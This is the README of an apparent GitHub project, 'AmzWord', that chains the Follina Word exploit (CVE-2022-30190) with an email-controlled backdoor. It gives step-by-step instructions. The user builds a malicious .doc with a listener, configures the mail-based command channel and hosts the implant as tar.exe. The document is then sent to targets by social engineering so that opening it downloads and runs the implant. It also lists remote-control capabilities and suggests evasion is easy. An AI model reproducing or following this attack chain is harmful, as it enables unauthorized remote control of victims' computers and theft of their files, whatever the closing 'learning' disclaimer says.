# AmzWord

an automated attack chain based on CVE-2022-30190, 163 email backdoor, and image steganography

Thanks to the following github repository, we referenced and modified part of the code to integrate and implement our work:

- [gdog](https://github.com/maldevel/gdog)
- [follina](https://github.com/Noxtal/follina)
- [virtual-reality](https://github.com/rokups/virtual-reality)

中文README[请看这里](https://github.com/Jump-Wang-111/AmzWord/blob/master/README_zh.md)

# Requirements

gdog：

- Python 2.7
- PyCrypto module
- WMI module
- Enum34 module
- Netifaces module

follina：

- Python 3.x

# Usage & attack process

1. Use follina.py to build a malicious word file and turn on http listening

   - You can change the default name and default ip in the code
   - You can also use `--ip` and `--output` to specify
   - Please refer to [follina](https://github.com/Noxtal/follina) for detailed usage. We have not changed the usage interface.
   - eg: `python follina.py --ip 100.100.100.100 --output maldoc.doc`

2. Modify client.py and gdog.py under gdog and fill in the following information

   ```python
   gmail_user = 'your email'
   gmail_pwd = 'your pwd'
   server = "smtp server"
   imap_server = 'imap server'
   ```

3. Compile client.py into tar.exe and place it under /follina/www

4. Use any social engineering method to send it to the target. As long as the victim opens word, tar.exe will be automatically downloaded and executed.

5. The attacker runs gdog locally and sends commands to control the target machine. For usage, see [follina](https://github.com/Noxtal/follina)

# Remark

1. This is just a demo of the attack chain implementation. The running exe can even be found in the task manager, which makes it easy to observe the effect. We did not perform any operations such as anti-virus, hiding, and privilege escalation. Of course, these are not difficult on Windows, right?
2. The gdog project has been around for a long time, and we have spent a lot of effort to make it run successfully. The remote control commands that are currently confirmed include: executing commands, taking screenshots, pop-up windows, shutting down, locking the screen, and transferring files. These functions Sufficient to suit most needs.
3. I don’t know why, but there seems to be some problem with imap’s SUBJECT search. We cannot search for emails with the target subject, and the return value is empty. We can only take other methods, such as reading all unread emails, filtering out the targets, and then setting others as unread. This may cause problems when there are many controlled users and needs to be solved.
4. This project is only for learning and exchange purposes.